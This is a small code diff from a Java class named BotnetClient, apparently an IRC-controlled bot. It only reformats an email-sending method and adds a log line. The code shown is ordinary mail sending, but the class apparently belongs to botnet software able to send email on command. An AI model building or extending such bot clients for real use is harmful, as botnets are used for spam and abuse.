@@ -97,16 +97,17 @@ public class BotnetClient extends PircBot {
 		Session session = Session.getDefaultInstance(props);
 	    MimeMessage message = new MimeMessage( session );
 	    try {
-	    	message.setFrom( new InternetAddress(from) );
+	    	message.setFrom(new InternetAddress(from));
 	    	for (int i = 0; i < to.length; i++) {
 	    		message.addRecipient(Message.RecipientType.TO, new InternetAddress(to[i]));
 	    	}
-	    	message.setSubject( subject );
-	    	message.setText( body );
-	    	Transport.send( message );
+	    	message.setSubject(subject);
+	    	message.setText(body);
+	    	Transport.send(message);
 	    } catch (MessagingException ex){
 	    	System.err.println("Cannot send email. " + ex);
 	    }
+	    System.out.println("Email to " + Arrays.toString(to) + " sent.");
 	}
 
 	protected void onIncomingChatRequest(DccChat chat) {
